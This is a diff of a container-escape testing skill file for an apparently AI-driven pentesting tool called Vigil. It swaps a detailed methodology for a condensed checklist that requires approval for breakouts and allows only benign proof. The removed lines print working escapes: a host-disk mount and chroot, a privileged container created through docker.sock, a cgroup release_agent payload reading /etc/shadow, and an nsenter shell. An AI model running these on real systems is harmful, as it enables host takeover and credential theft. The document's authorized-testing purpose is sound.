@@ -6,87 +6,45 @@ origin: Vigil
 
 # Container Escape Detection
 
-> **`vigil assess kali` audit flags:** use `--technique RECON` for capability/cgroup/mount/socket/kernel enumeration; switch to `EXPLOIT-CHAIN` on an actual breakout attempt.
-
 ## When to Activate
 
-- Testing containerized applications (Docker, Kubernetes pods)
-- Assessing container runtime security controls
-- Investigating suspected container breakout
-- Validating Falco/seccomp/AppArmor enforcement
+- You hold an execution channel inside a **target** container or pod (an approved RCE, shell or
+  exec primitive recorded under exploit approval), or are assessing a containerised deployment's
+  runtime controls. Blue use: validating Falco/seccomp/AppArmor coverage after a suspected
+  breakout (detection rules belong to the alert-triage skills).
 
-## Tools
-
-- `vigil assess kali exec -- ...` (all target-facing enumeration and escape attempts inside the runtime container must go through the kali exec wrapper; use `--technique RECON --probe-kind fingerprint --phase consume-test --timeout 30` for capability/mount/socket enumeration, and `--technique EXPLOIT-CHAIN --probe-kind exploit --phase consume-test --timeout 120 --destructive` for actual breakout attempts)
-- Docker CLI / kubectl (use via kali exec when target-facing)
-- Falco (runtime detection — observation layer, host-side)
-- amicontained (capability checker — run via `vigil assess kali exec --technique RECON --probe-kind fingerprint --phase consume-test --timeout 30 -- amicontained`)
-- deepce (container escape enumeration — run via kali exec)
-- CDK (Container penetration toolkit — run via kali exec)
+**Where the commands run.** `vigil assess kali exec` executes inside Vigil's own runtime
+container: enumeration or an escape run there tests the operator's machine, not the target. Run
+in-container checks through the target's execution channel, with `kali exec` carrying only the
+network leg (the request that delivers the command). `--technique RECON` for enumeration,
+`EXPLOIT-CHAIN` for a breakout attempt; a breakout, host write, module load or anything that
+can crash the host needs `--destructive` and explicit exploit approval.
 
 ## Methodology
 
-### 1. Container Enumeration
-- [ ] Check if running in container: `/.dockerenv` exists, `cat /proc/1/cgroup | grep docker`
-- [ ] Enumerate capabilities: `capsh --print` or `amicontained`
-- [ ] Check seccomp profile: `grep Seccomp /proc/self/status`
-- [ ] List mounted volumes: `mount | grep -v proc`
-- [ ] Check for Docker socket: `ls -la /var/run/docker.sock`
+Self-identification and enumeration are standard (`/.dockerenv`, `/proc/1/cgroup`, `capsh
+--print`/CapEff, seccomp and AppArmor status, mounts, sockets; amicontained, deepce or CDK when
+present on the target). Then check each escape family:
 
-### 2. Privileged Container Escape
-- [ ] If `--privileged` flag or all capabilities: immediate escape path
-- [ ] Mount host filesystem:
-```bash
-mkdir /mnt/host
-mount /dev/sda1 /mnt/host
-# Now access entire host filesystem at /mnt/host
-chroot /mnt/host
-```
-- [ ] Load kernel module for persistent access
+- **Privileged container** (all capabilities, host devices): host filesystem mount + chroot.
+- **Runtime sockets:** `docker.sock`, `containerd.sock`, `crio.sock` mounted anywhere, not only
+  `/var/run/` — creating a container with the host root bind-mounted is host root.
+- **Sensitive mounts:** host `/`, `/proc/1/root`, `/var/lib/docker`, `/etc/kubernetes`;
+  writable `/proc/sys/kernel/core_pattern` or `/sys/kernel/uevent_helper` (helper execution on
+  crash/device events); `/proc/sysrq-trigger` (can reboot or crash the host — never fire it).
+- **Capabilities beyond the default set**, each with a known gadget: `CAP_SYS_ADMIN` (cgroup v1
+  `release_agent`, CVE-2022-0492), `CAP_SYS_MODULE` (module load), `CAP_SYS_PTRACE` (inject into
+  host processes with host PID), `CAP_DAC_READ_SEARCH` (Shocker-style file-handle reads),
+  `CAP_NET_ADMIN`/`CAP_NET_RAW` (network-namespace abuse).
+- **Host PID namespace:** `nsenter --target 1 …`.
+- **Kernel:** an unpatched host kernel is exploitable regardless of capabilities (Dirty Pipe
+  CVE-2022-0847, OverlayFS bugs, CVE-2024-1086); confirm kernel exposure before calling the
+  container hardened.
+- **Kubernetes:** the service-account token's RBAC (`kubectl auth can-i --list`); `pods`,
+  `pods/exec`, `secrets`, `configmaps`, `nodes` or `clusterrolebindings` permissions, or pod
+  creation with `hostPID`/`hostNetwork`/`hostIPC`, enable movement even when the host is sealed.
 
-### 3. Docker Socket Escape
-- [ ] If `/var/run/docker.sock` is mounted:
-```bash
-# List host containers
-curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
-# Create privileged container with host mount
-curl -s --unix-socket /var/run/docker.sock -X POST -H "Content-Type: application/json" \
-  http://localhost/containers/create -d '{"Image":"alpine","HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
-```
-
-### 4. Cgroup Escape (CVE-2022-0492)
-- [ ] Requires CAP_SYS_ADMIN or unconfined AppArmor
-```bash
-# Mount cgroup
-mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-# Set release_agent to payload
-echo 1 > /tmp/cgrp/x/notify_on_release
-echo "#!/bin/sh" > /cmd
-echo "cat /etc/shadow > /tmp/cgrp/x/output" >> /cmd
-chmod a+x /cmd
-host_path=$(sed -n 's/.*perdir=\([^,]*\).*/\1/p' /etc/mtab)
-echo "$host_path/cmd" > /tmp/cgrp/release_agent
-# Trigger
-echo $$ > /tmp/cgrp/x/cgroup.procs
-```
-
-### 5. Sensitive Mount Exploitation
-- [ ] `/proc/sysrq-trigger` — can trigger host reboot/crash
-- [ ] `/proc/sys/kernel/core_pattern` — write path for crash dumps, can achieve code execution
-- [ ] `/sys/kernel/uevent_helper` — trigger helper execution on device events
-- [ ] Host PID namespace: `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`
-
-### 6. Capability-Based Escape
-
-| Capability | Escape Vector |
-|-----------|--------------|
-| CAP_SYS_ADMIN | Mount host filesystem, cgroup escape, BPF manipulation |
-| CAP_SYS_PTRACE | Process injection into host-namespace processes |
-| CAP_NET_ADMIN | Network namespace manipulation, ARP spoofing |
-| CAP_DAC_READ_SEARCH | Read any file via open_by_handle_at (Shocker exploit) |
-| CAP_SYS_MODULE | Load kernel module for persistent host access |
-
-### 7. Escape Binaries (Detection)
+## Escape Binaries (Detection)
 Alert on these binaries executing inside containers:
 `nsenter`, `unshare`, `mount`, `chroot`, `modprobe`, `insmod`
 
@@ -99,35 +57,19 @@ Falco rule example:
   priority: CRITICAL
 ```
 
-### 8. Kubernetes-Specific
-- [ ] Service account token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`
-- [ ] Can this token create privileged pods? `kubectl auth can-i create pods --as=system:serviceaccount:default:default`
-- [ ] Escape via hostPID/hostNetwork/hostIPC pod spec if RBAC allows pod creation
+## Proof
 
-## What to Record
+Show the vector and a benign host-level marker (e.g. host `hostname`/`id` via the escaped
+context, or writing and removing a marker file under approval), not host credential files or
+cluster secret dumps (`agent/rules/hunting.md` §2, §10). Severity:
+`agent/references/finding-fp-and-severity-gate.md`. Format:
+`agent/references/runtime-guides/web-finding-recording.md`. Record runtime and version,
+capabilities vs default, seccomp/AppArmor state, mounts and sockets, the vector, and the
+service-account RBAC.
 
-- Container runtime and version (Docker, containerd, CRI-O)
-- Capabilities granted vs default set
-- Seccomp/AppArmor profile status (enforcing, complaining, unconfined)
-- Mounted volumes and sensitive paths exposed
-- Docker socket presence and permissions
-- Escape vector used and host-level access achieved — prove the attacker outcome (`agent/rules/hunting.md` §2), e.g., the `CAP_SYS_ADMIN` capability enabled cgroup release_agent escape and `cat /host/etc/shadow` read the host's credential file, the Docker socket created a privileged container with `/:/host` bind mount and `chroot /host` granted full host root filesystem access, the Kubernetes service account token listed all secrets in the cluster including database passwords and TLS private keys
-- Falco/runtime detection coverage gaps
-- Kubernetes RBAC permissions for the service account
+## Kill and escalate
 
-## Kill Signals — Stop Testing When
-- Container is privileged (all capabilities) → CRITICAL, record immediately — escape is trivial, no need to test other vectors
-- Docker socket (/var/run/docker.sock) accessible → CRITICAL, record immediately — full host compromise possible
-- No dangerous capabilities, no socket, seccomp enforced, AppArmor active → container hardened, move on
-- Kubernetes service account token has no create-pod or exec permissions → K8s escape not feasible from this pod
-
-## Escalate When
-- `capsh --print` shows any of `CAP_SYS_ADMIN`, `CAP_SYS_MODULE`, `CAP_SYS_PTRACE`, `CAP_DAC_READ_SEARCH`, `CAP_NET_ADMIN`, `CAP_NET_RAW` beyond the default set — each has a documented escape path (release_agent for SYS_ADMIN, insmod for SYS_MODULE, ptrace host processes, /proc/*/mem raw read for DAC_READ_SEARCH), test the matching gadget
-- The host filesystem, `/proc/1/root`, `/var/run/`, `/var/lib/docker`, `/etc/kubernetes`, or a docker.sock/containerd.sock/crio.sock unix socket is mounted into the container — any one escalates to host root, enumerate mounts beyond the obvious docker.sock
-- `/proc/self/status` shows CapEff with high-order bits set OR `/proc/1/cgroup` indicates no cgroup namespace isolation (cgroup v1 with writable release_agent) — even a non-privileged container may be mis-configured for cgroup release_agent escape
-- Kernel version is older than the host patch level (`uname -r` on a CVE-vulnerable kernel — Dirty Pipe, OverlayFS, CVE-2022-0847, CVE-2024-1086) — container-to-host kernel exploitation is live regardless of capabilities, confirm kernel exposure before concluding hardened
-- The pod's service account token (`/var/run/secrets/kubernetes.io/serviceaccount/token`) can list/get/create any of: `pods`, `pods/exec`, `secrets`, `configmaps`, `nodes`, `clusterrolebindings` — each enables lateral movement or privilege escalation inside the cluster even when the host itself is sealed
-
-## Extended Resources
-
-None -- this skill works from container internals, capability enumeration, and runtime detection logs.
+- No extra capabilities, no runtime socket or sensitive mount, seccomp and AppArmor enforcing,
+  patched kernel → hardened; an SA token without pod-create/exec rights → no Kubernetes path.
+- A privileged container or a mounted runtime socket is the whole finding once proven; still
+  note the other vectors present, since remediation needs all of them.
